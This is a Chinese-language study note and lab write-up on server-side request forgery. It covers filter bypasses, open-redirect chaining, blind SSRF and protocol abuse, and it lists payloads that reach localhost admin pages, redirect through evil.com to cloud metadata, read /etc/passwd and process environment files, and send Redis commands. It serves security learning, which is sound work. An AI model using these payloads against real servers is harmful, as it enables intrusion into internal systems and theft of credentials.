---
title: SSRF服务端请求伪造
description: SSRF原理、绕过技巧、内网探测、协议利用、盲打SSRF
tags: [ssrf, 服务端请求伪造, 内网探测]
status: 已完成
finish-date: 2026-05-14
difficulty: 困难
---

## SSRF的本质
1. 什么是SSRF：是一种允许攻击者诱导服务器非预期位置发起请求的安全漏洞
2. 核心问题：服务器无条件信任用户提供的URL，并用自己的身份去访问 
## SSRF为什么危险
服务器通常具有很高的权限
    1. 访问内网、云元数据服务
    2. 读取服务器本地文件
    3. 内网之间通常互相信任不做严格认证
攻击者可以通过SSRF利用服务器的身份和权限
## SSRF成功利用的危害
1. 在应用程序或后端系统中执行未授权操作
2. 访问未授权的数据
3. 在某些情况下执行任意命令
4. 若与第三方系统交互，攻击者可能会反向攻击托管该应用的阻止内部网络
## 常见的SSRF攻击
1. 针对服务器本身的SSRF攻击
   1. 手法：利用回环网络接口（127.0.0.1 或 localhost），让应用向自己发起HTTP请求。
   2. 示例：
        购物应用查询库存时，前端提交：
        ```text
        POST /product/stock HTTP/1.0
        stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
        攻击者修改 stockApi 为：
        ```
        ```text
        stockApi=http://localhost/admin
        ``` 
   3. 原理：通过调用/product/stock这个服务端功能，诱导服务器自己向本机回环地址http://localhost/admin发起请求，由于该请求的源IP是127.0.0.1，绕过了基于IP的访问控制，从而获取到本不应被外网用户看到的/admin接口数据。
   4. 关键点：
      1. /admin是服务器本地独立监听的另一个应用服务
      2. SSRF让攻击者借着服务器的身份去访问该应用服务从而绕过访问控制
   5. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-17-51-02.png)正常请求的API![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-20-40-48.png)修改为http://127.0.0.1/admin![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-20-42-50.png)接着修改请求完成最终的操作![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-20-44-37.png)
2. 针对其他后端系统的SSRF攻击
   1. 原理：应用服务器能与内部不可路由的后端系统交互（如192.168.0.68），这些系统通常安全较弱。在许多情况下,内部后端系统包含一些敏感功能,任何能够与系统交互的人均可在无需身份验证的情况下访问。
   2. 示例：`stockApi=http://192.168.0.68/admin`
   3. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-02-15.png)![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-03-58.png)抓包发送到intruder中进行爆破扫描![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-06-03.png)找到目标`192.168.0.65`![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-07-52.png)![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-08-48.png)
## 绕过常见的SSRF防御
1. 绕过黑名单过滤
   1. 防御：封禁 127.0.0.1、localhost、/admin 等
   2. 绕过手法
      1. 十六进制、八进制等替代127.0.0.1【127.0.0.1 → 2130706433（十进制）、017700000001（八进制）、127.1】
      2. 将自己的域名解析到127.0.0.1【spoofed.burpcollaborator.net】
      3. 大小写绕过/URL编码【`http://LOCALHOST/admin`、`http://127.0.0.1/%61dmin`】
      4. 重定向绕过【自己控制的URL重定向到目标地址，尝试不同协议切换（http→https）】
         1. 原理：利用防御层和实际请求层对重定向处理的不一致
         ```
            防御层校验：检查初始URL → 在白名单内 ✅
                ↓
            应用跟随重定向 → 跳转到内网地址
                ↓
            实际请求层：发起请求 → 访问内网资源 ✅（此时已不再校验）
         ``` 
         2. 示例：
            1. SSRFpayload
               ```http
                POST /product/stock HTTP/1.1
                Host: vulnerable.com
                Content-Type: application/x-www-form-urlencoded

                stockApi=https://evil.com/redirect?to=http://169.254.169.254/latest/meta-data/
               ``` 
            2. 请求链
               ```
               1. vulnerable.com 校验 stockApi→ 域名 evil.com 不在黑名单中？✅
               2. vulnerable.com 请求 https://evil.com/redirect?to=http://169.254.169.254/
               3. evil.com 返回 302 重定向到 http://169.254.169.254/
               4. vulnerable.com 跟随重定向→ 请求 http://169.254.169.254/（内网地址）→ 不再校验！
               5. 元数据被返回 → 攻击者获得敏感信息
               ``` 
   3. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-22-53.png)
      1. ![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-23-45.png)首先大小写绕过对localhost的过滤
      2. ![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-26-12.png)然后URL编码绕过对admin的过滤
      3. 完成指定操作![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-21-37-09.png)
2. 绕过白名单过滤
   1. 防御：只允许匹配特定域名或开头的URL。
   2. 绕过原理：利用URL解析不一致【让防御代码和实际请求代码对同一个URL解析出不同的结果——防御代码看到一个"安全"的域名，而实际HTTP请求发往攻击者控制的目标。】
   3. 手法：
      1. 嵌入凭据（@符号）
         1. payload：`https://expected-host:fakepassword@evil-host`
         2. 详解：在URL规范中，@符号前面部分表示用户认证信息
            ```
            格式：protocol://username:password@hostname/path
            示例：https://user:pass@example.com
            ``` 
            ![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-22-15-15.png)
      2. 使用片段标识（#）
         1. payload：`https://evil-host#expected-host`
         2. 详解：#在URL中表示片段标识符（Fragment），用于定位页面内的锚点。标准规定：片段标识符不会被发送到服务器。
            ![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-22-18-44.png) 
      3. DNS子域名欺骗
         1. payload：`https://expected-host.evil-host`
         2. 详解：evil-host是你控制的域名，expected-host作为它的子域名前缀。
         3. 攻击流程
            ```
            1. 注册域名: attacker.com
            2. 创建子域名: trusted.attacker.com
            3. 将 *.attacker.com 解析到自己的服务器

            防御规则: 只允许 trusted.com

            攻击者的Payload: https://trusted.com.attacker.com
                                          ↑           ↑
                                        匹配到了！    实际域名
            ```  
            ![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-22-29-45.png)
      4. URL编码/双编码
         1. 单编码：将 / 编码为 %2F
            `https://expected-host%2Fevil-host`
         2. 双编码：将 / 两次编码为 %252F
            `https://trusted.com%252F@evil.com`
         3. 编码其他字符：%2e = .
            `https://trusted%2ecom@evil.com` 
   4. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-22-35-19.png)![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-08-52-32.png)
      1. ![](SSRF漏洞原理+靶场通关实验报告/2026-05-13-22-37-52.png)域名必须是`stock.weliketoshop.net`
      2. payload：`http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
      3. 详解：
         1. @stock.weliketoshop.net绕过白名单限制，在waf中过滤器会对%2523解码一次变成%23认为没有#这种特殊字符所以通过检查，然后提取到@stock.weliketoshop.net认为URL合法，放行
         2. 后端服务器进行请求时会进行第二次URL解码%23变成#后端服务器会忽略#后面的部分，从而请求localhost:80/admin/delete?username=carlos
3. 通过重定向绕过过滤
   1. 如果目标应用本身存在开放重定向漏洞。
   2. 示例：
      应用内有如下重定向功能：
      ```text
      /product/nextProduct?currentProductId=6&path=http://evil-user.net
      ```
      攻击者构造：
      ```text
      stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
      ```
      白名单校验通过（域名合法），但请求后触发重定向到内网地址。
   3. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-12-16-22.png)
      1. 寻找有开放重定向漏洞的页面发现/product/nextProduct中参数path的值被直接填入重定向的Location位置![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-04-45.png)
      2. 构造payload`stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin`
         ![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-07-33.png) 
      3. 攻击流程：
         1. 第一步：下达指令：请求 /product/stock 接口，并把 stockApi 参数设置成一个指向开放重定向漏洞的特殊地址：
         ```text
         stockApi = /product/nextProduct?path=http://192.168.0.12:8080/admin
         ```
         2. 第二步：SSRF检查放行:服务器的SSRF防御机制看到 stockApi 是一个相对路径（/product/...），认为你要请求的是它自己的功能，于是放行。
         3. 第三步：服务器触发重定向:服务器根据你的指令，去请求`/product/nextProduct?path=http://192.168.0.12:8080/admin`这个请求是服务器发给自己的。服务器上的“Next product”功能发现 path 参数不是本地地址，于是返回一个 302 重定向，告诉请求方：“你要去的地方是`http://192.168.0.12:8080/admin`
         4. 第四步：最终访问内网：服务器收到自己返回的302重定向后，会忠实地跟随这个指令，再次发起请求，而这次的目标就是内网地址 http://192.168.0.12:8080/admin。因为请求发自服务器自身，它在内网，所以可以成功访问。
      4. ![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-08-23.png)
## SSRF盲打
1. 什么是blind SSRF：应用程序服务器会被攻击者诱导向攻击者提供的URL发起请求，但该请求的响应不会返回到应用程序的前端响应中
   ```
   普通SSRF：攻击者 → 服务器 → 内网目标 → 响应返回 → 攻击者可读
   盲SSRF：  攻击者 → 服务器 → 内网目标 → 响应被丢弃 → 攻击者看不到
   ``` 
2. 影响是什么:
   Blind SSRF的单向性，其影响源低于普通SSRF
   ![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-11-34-44.png) 
   **注意**在某些情况下，盲SSRF仍然可以实现完整的远程代码执行（RCE）——例如结合Shellshock漏洞或攻击服务端HTTP客户端的漏洞。 
3. 如何查找利用
   1. 最可靠的检测方法：带外检测【OAST】
      1. 查找流程：
         ```
         1. 准备一个攻击者可控的服务器（用于记录HTTP、DNS请求）
         2. 在SSRF参数中提交攻击者可控服务器的地址
         3. 测试SSRF
         4. 如果存在Blind SSRF，攻击者可控的服务器会出现请求记录
         ``` 
      2. 常见现象：
         1. 只有DNS查询记录而没有后续的HTTP请求
         2. 原因：
            应用程序发群里HTTP请求触发了DNS解析
            网络层防火墙阻止了对外部的HTTP连接
            但DNS流量通常是被允许的
         3. 即使只有DNS交互，也说明应用程序存在SSRF漏洞——只是出站HTTP被限制了。
      3. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-13-32.png)将referer的值换为bp中Collaborator提供的地址![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-19-58.png)![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-19-37.png)
   2. 利用思路：
      1. 内网漏洞探测（盲扫）
      2. 路由Shellshock等著名漏洞
         1. 实战演练：![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-22-55.png)
         2. 攻击流程
            1. 核心漏洞利用：外网服务器作为跳板访问内网+内网服务器的致命漏洞执行命令
            2. 利用步骤
               1. 带外探测确认存在Blind SSRF![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-34-09.png)![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-13-33-49.png)
               2. 构造特洛伊木马（shellshock payload）
      3. 攻击服务端的HTTP客户端
      4. SSRF常用协议/伪协议详解![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-22-15-07.png)
         1. http/https：
            1. 用途：
               内网Web服务探测
               访问内网管理界面
               指纹识别内网应用
            2. 局限：
               只能访问HTTP服务
               响应可能被过滤或不返回
         2. file://伪协议-本地文件读取
            1. 用途：读取服务器本地文件（包括敏感配置文件）
            2. 示例：
               ```
               file:///etc/passwd          # Linux用户信息
               file:///c:/windows/win.ini  # Windows系统文件
               file:///etc/hosts           # 内网主机映射
               file:///proc/self/environ   # 进程环境变量（可能包含密钥）
               file:///var/www/html/config.php  # Web配置文件
               ```
            3. 利用条件：
               后端支持file://协议（PHP的allow_url_fopen常开启此支持）
               能读取到文件内容并返回
         3. dict:// - 字典协议探测
            1. 用途：
               端口探测（判断端口是否开放）
               与内网服务进行简单交互（如Redis、Memcached）
            2. 示例：
               1. 端口探测：
                  ```
                  # 探测端口是否开放（通过响应时间或错误信息）
                  dict://192.168.1.1:22/               # SSH端口
                  dict://192.168.1.1:3306/             # MySQL端口
                  dict://192.168.1.1:6379/             # Redis端口
                  ```
                  响应特征：
                  端口开放：返回特定协议的banner或错误（如ERR unknown command）
                  端口关闭：连接超时或拒绝连接错误
               2. 与Redis交互
                  ```
                  # 获取Redis服务器信息
                  dict://192.168.1.100:6379/INFO

                  # 获取Redis配置
                  dict://192.168.1.100:6379/CONFIG GET *

                  # 读取Redis数据
                  dict://192.168.1.100:6379/GET mykey
                  ```
         4. gopher:// 万能协议
            1. 用途：构造任意TCP请求，攻击内网中几乎所有基于TCP的服务（Redis、MySQL、FastCGI、SMTP等）
            2. 原理：gopher://协议允许用户指定要发送的原始TCP数据，后端会将数据直接发送到目标端口 
            3. 语法：`gopher://<host>:<port>/_<URL编码后的TCP数据>`
               _（下划线）后的内容是要发送的原始数据（需要URL编码）
               可以发送任意字节，包括不可见字符、换行符等
            4. 限制：
               不是所有语言/库都支持（PHP的cURL支持，file_get_contents通常不支持）
               需要对目标协议有深入了解
               数据必须正确URL编码（包括换行符%0d%0a）
         5. ftp:// 文件传输
            1. 用途：
               读取FTP服务器上的文件
               在某些情况下进行端口探测
            2. 示例：
               ```
               ftp://192.168.1.1:21/
               ftp://anonymous:anonymous@192.168.1.1/pub/file.txt
               ```
            3. 利用：
               如果FTP服务允许匿名登录，可以读取文件
               可以用于探测内网FTP服务是否存在     
         6. tftp:// 简单文件传输协议
            1. 用途：读取TFTP服务器上的文件（常用于读取路由器、网络设备配置文件）
            2. 示例：`tftp://192.168.1.1/conf/config.txt`
         7. ldap:// - 轻量级目录访问协议
            1. 用途：访问内网LDAP目录服务（可能泄露用户信息）
            2. 示例：`ldap://192.168.1.1:389/dc=company,dc=com`
         8. jar:// - Java专用（Java SSRF）
            1. 用途：读取JAR包内的文件（相当于JAR文件系统）
            2. 示例：`jar:file:///var/www/app.jar!/WEB-INF/web.xml`
            3. 利用条件：Java环境，支持jar://协议
   3. 检测与利用流程
      ![](SSRF漏洞原理+靶场通关实验报告/2026-05-14-11-45-03.png)
## 为SSRF寻找隐藏的攻击面
1. 部分URL参数:前端只提交主机名或路径，服务端拼接完整URL
2. 数据格式中的URL:XML、JSON、YAML等格式里嵌入URL（XXE常伴随SSRF）
3. Refer头:某些分析服务会请求Referer中的第三方URL
